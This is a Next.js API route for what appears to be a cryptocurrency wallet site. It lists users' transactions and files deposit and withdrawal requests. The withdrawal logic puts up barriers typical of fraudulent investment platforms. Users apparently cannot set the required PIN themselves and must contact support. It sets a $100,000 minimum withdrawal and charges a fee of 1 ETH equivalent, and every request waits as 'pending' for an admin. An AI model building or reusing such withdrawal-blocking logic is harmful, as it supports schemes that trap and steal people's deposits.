import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { verifyToken, comparePin } from "@/lib/auth";
import { sendAdminNotificationEmail } from "@/lib/email";
import { FUNCTIONAL_COINS } from "@/lib/coins";

const MIN_WITHDRAWAL_USD = 100_000;
const ETH_FEE_USD_FALLBACK = 3500;

async function getEthUsd(): Promise<number> {
  try {
    const res = await fetch(
      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
      { next: { revalidate: 60 } }
    );
    if (res.ok) {
      const d = await res.json();
      return d?.ethereum?.usd ?? ETH_FEE_USD_FALLBACK;
    }
  } catch { /* ignore */ }
  return ETH_FEE_USD_FALLBACK;
}

async function getCoinUsd(coingeckoId: string): Promise<number> {
  try {
    const res = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`,
      { next: { revalidate: 60 } }
    );
    if (res.ok) {
      const d = await res.json();
      return d?.[coingeckoId]?.usd ?? 0;
    }
  } catch { /* ignore */ }
  return 0;
}

export async function GET(req: NextRequest) {
  const token = req.cookies.get("token")?.value;
  const payload = token ? verifyToken(token) : null;
  if (!payload) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const { searchParams } = new URL(req.url);
  const coin = searchParams.get("coin");
  const network = searchParams.get("network");

  const where: Record<string, unknown> = { userId: payload.userId };
  if (coin) where.coin = coin;
  if (network) where.network = network;

  const transactions = await prisma.transaction.findMany({
    where,
    orderBy: { createdAt: "desc" },
  });
  return NextResponse.json({ transactions });
}

export async function POST(req: NextRequest) {
  try {
    const token = req.cookies.get("token")?.value;
    const payload = token ? verifyToken(token) : null;
    if (!payload) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

    const body = await req.json();
    const { type, coin, network, amount, address, pin } = body;

    if (!type || !coin || !network || !amount) {
      return NextResponse.json({ error: "Missing fields" }, { status: 400 });
    }

    if (type === "withdraw") {
      if (!pin) return NextResponse.json({ error: "PIN required" }, { status: 400 });

      const user = await prisma.user.findUnique({ where: { id: payload.userId } });
      if (!user) return NextResponse.json({ error: "User not found" }, { status: 404 });

      if (!user.withdrawalPin) {
        return NextResponse.json({ error: "No withdrawal PIN set. Contact support." }, { status: 400 });
      }

      const pinValid = await comparePin(String(pin), user.withdrawalPin);
      if (!pinValid) return NextResponse.json({ error: "Incorrect PIN" }, { status: 401 });

      const wallet = await prisma.wallet.findUnique({
        where: { userId_coin_network: { userId: payload.userId, coin, network } },
      });
      if (!wallet || wallet.balance < parseFloat(amount)) {
        return NextResponse.json({ error: "Insufficient balance" }, { status: 400 });
      }

      // Fee and minimum withdrawal checks
      const coinDef = FUNCTIONAL_COINS.find(c => c.coin === coin && c.network === network);
      if (coinDef) {
        const [ethUsd, coinUsd] = await Promise.all([
          getEthUsd(),
          getCoinUsd(coinDef.coingeckoId),
        ]);
        if (coinUsd > 0 && ethUsd > 0) {
          const feeCoin = ethUsd / coinUsd;
          const amtNum = parseFloat(amount);
          if (amtNum <= feeCoin) {
            return NextResponse.json(
              { error: "Amount is insufficient to cover the network fee (1 ETH equivalent)." },
              { status: 400 }
            );
          }
          const withdrawalUsd = amtNum * coinUsd;
          if (withdrawalUsd < MIN_WITHDRAWAL_USD) {
            return NextResponse.json(
              { error: `Minimum withdrawal is $100,000 USD equivalent. Your withdrawal is approximately $${Math.round(withdrawalUsd).toLocaleString()}.` },
              { status: 400 }
            );
          }
        }
      }
    }

    const tx = await prisma.transaction.create({
      data: {
        userId: payload.userId,
        type,
        coin,
        network,
        amount: parseFloat(String(amount)),
        address: address || null,
        status: "pending",
      },
    });

    const user = await prisma.user.findUnique({ where: { id: payload.userId } });
    if (user) {
      await sendAdminNotificationEmail(type, user.username, parseFloat(String(amount)), coin, network);
    }

    return NextResponse.json({ transaction: tx });
  } catch (err) {
    console.error("[transactions POST]", err);
    return NextResponse.json({ error: "Server error. Please try again." }, { status: 500 });
  }
}
